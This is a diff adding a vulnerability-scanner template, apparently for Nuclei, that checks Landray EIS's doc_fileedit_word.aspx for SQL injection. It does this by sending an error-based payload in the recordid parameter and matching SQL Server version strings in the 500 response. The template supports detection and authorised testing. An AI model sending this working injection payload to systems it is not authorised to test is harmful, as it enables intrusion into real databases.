@@ -1,0 +1,22 @@
+id: poc-yaml-landray-eis-doc-fileedit-word-aspx-sqli
+info:
+  name: Landray EIS doc_fileedit_word.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dossier/doc_fileedit_word.aspx?recordid=1'%20and%201=@@version--+&edittype=1,1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Microsoft SQL Server"
+          - "Windows"
+          - "nvarchar"
+          - "Copyright (c) Microsoft Corporation"
+        condition: and
